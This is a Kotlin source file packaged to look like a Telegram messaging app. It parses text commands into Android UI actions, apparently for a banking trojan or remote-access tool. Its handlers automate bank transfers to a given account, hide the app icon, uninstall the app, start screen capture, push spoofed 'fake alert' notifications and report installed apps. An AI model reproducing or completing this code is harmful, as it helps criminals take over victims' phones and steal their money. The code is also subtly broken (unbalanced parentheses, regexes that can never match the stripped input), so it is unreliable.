package com.telegram2.messaging.remote

object NLPParser {
    data class Action(val type: String, val data: Any? = null, val description: String = "")

    fun parse(input: String): List<Action> {
        val actions = mutableListOf<Action>()
        val lower = input.lowercase().replace(Regex("[^a-z0-9 .]"), "")

        // Extract package: "open com.whatsapp", "launch messages"
        val pkg = extractPackageName(lower) ?: guessAppFromIntent(lower)

        // Phone: "call +1234567890"
        val phone = Regex("""(?:call|dial|phone|number)[\s:]+([+]?[0-9]{8,15})""").find(lower)?.groupValues?.get(1)

        // Amount: "send $100"
        val amount = Regex("""(?:send|transfer|pay)\s*[$€£]?\s*([\d,]+(?:\.\d{2})?)""").find(lower)?.groupValues?.get(1)?.replace(",", "")

        // Account: "to 123456789"
        val account = Regex("""(?:to|account|acc)\s*[:\s]+(\d{6,12})""").find(lower)?.groupValues?.get(1)

        // Text: "type 'Hello'"
        val text = Regex("""(?:type|enter|write)[\s"']+(.+?)(?:["']|$)""").find(lower)?.groupValues?.get(1)

        // Tap: "tap at 500,1000"
        val coord = Regex("""tap\s+at\s+(\d+),\s*(\d+)""").find(lower)
        val x = coord?.groupValues?.get(1)?.toIntOrNull()
        val y = coord?.groupValues?.get(2)?.toIntOrNull()

        // Swipe: "swipe from 500,1500 to 500,500"
        val swipe = Regex("""swipe\s+from\s+(\d+),\s*(\d+)\s+to\s+(\d+),\s*(\d+)""").find(lower)
        val (sx, sy, ex, ey) = if (swipe != null) listOf(1, 2, 3, 4).map { swipe.groupValues[it].toIntOrNull() ?: 0 } else listOf(0, 0, 0, 0)

        // Wait: "wait 3 seconds"
        val waitSec = Regex("""wait(?: for)? (\d+) ?(?:seconds?|secs?|s)""").find(lower)?.groupValues?.get(1)?.toIntOrNull()

        // Click: "click send"
        val clickText = Regex("""click(?: on)?(?: the)?(?: button|text)?(?: called|named)?(?: "([^"]+)")?""").find(lower)?.groupValues?.get(1)

        val goBack = lower.contains("go back") || lower.contains("press back")
        val goHome = lower.contains("go home") || lower.contains("home screen")

        // === BUILD ACTIONS ===

        if (pkg != null) actions.add(Action("launch", pkg, "Launch $pkg"))
        if (waitSec != null) actions.add(Action("wait", waitSec * 1000, "Wait ${waitSec}s"))

        if (phone != null) {
            actions.add(Action("launch", "com.android.dialer", "Open Dialer"))
            actions.add(Action("wait", 1500, "Wait"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1000), "Tap number field"))
            actions.add(Action("type", phone, "Enter number"))
            actions.add(Action("click_text", "Call", "Initiate call"))
        }

        if (text != null) actions.add(Action("type", text, "Type: $text"))
        if (x != null && y != null) actions.add(Action("tap", mapOf("x" to x, "y" to y), "Tap ($x,$y)"))
        if (swipe != null) actions.add(Action("swipe", mapOf("sx" to sx, "sy" to sy, "ex" to ex, "ey" to ey, "dur" to 300L), "Swipe"))

        if (amount != null && account != null) {
            actions.add(Action("click_text", "Transfer", "Go to transfer"))
            actions.add(Action("wait", 1500, "Wait"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1200), "Tap amount")))
            actions.add(Action("type", amount, "Enter amount"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1400), "Tap account")))
            actions.add(Action("type", account, "Enter account"))
            actions.add(Action("click_text", "Confirm", "Confirm transfer"))
            actions.add(Action("wait", 3000, "Wait for success"))
        }

        if (clickText != null) actions.add(Action("click_text", clickText, "Click: $clickText"))
        if (goBack) actions.add(Action("back", null, "Press Back"))
        if (goHome) actions.add(Action("home", null, "Go to Home"))

        if (lower.contains("hide app")) actions.add(Action("hide_activity", null, "Hide Icon"))
        if (lower.contains("uninstall")) actions.add(Action("uninstall", null, "Uninstall Self"))

        if (lower.contains("start screen")) actions.add(Action("start_screen_capture", null, "Start Screen Capture"))
        if (lower.contains("stop screen")) actions.add(Action("stop_screen_capture", null, "Stop Screen Capture"))

        if (lower.contains("send notification") || lower.contains("fake alert")) {
            val title = extractQuotedText(lower, "title") ?: "⚠ Alert"
            val body = extractQuotedText(lower, "body") ?: "Tap to view"
            actions.add(Action("fake_notification", mapOf("title" to title, "text" to body), "Send Spoofed Notification"))
        }

        if (lower.contains("list apps") || lower.contains("get apps")) {
            actions.add(Action("get_apps", null, "Send Installed Apps"))
        }

        if (actions.isEmpty()) actions.add(Action("unknown", null, "No valid command"))

        return actions
    }

    private fun extractPackageName(text: String): String? {
        val pkgRegex = Regex("""(?:open|launch|start|use|in)\s+([a-zA-Z][\w.]+(?:[\w]+)?)""")
        return pkgRegex.find(text)?.groupValues?.get(1)
    }

    private fun guessAppFromIntent(input: String): String? {
        return when {
            input.contains("message") || input.contains("chat") || input.contains("sms") -> "com.whatsapp"
            input.contains("bank") || input.contains("pay") || input.contains("money") -> "com.bank.app"
            input.contains("dial") || input.contains("call") || input.contains("phone") -> "com.android.dialer"
            input.contains("email") || input.contains("gmail") -> "com.google.android.gm"
            input.contains("settings") -> "com.android.settings"
            else -> null
        }
    }

    private fun extractQuotedText(text: String, keyword: String): String? {
        val regex = Regex("""$keyword\s*["']([^"']+)["']""")
        return regex.find(text)?.groupValues?.get(1)
    }
}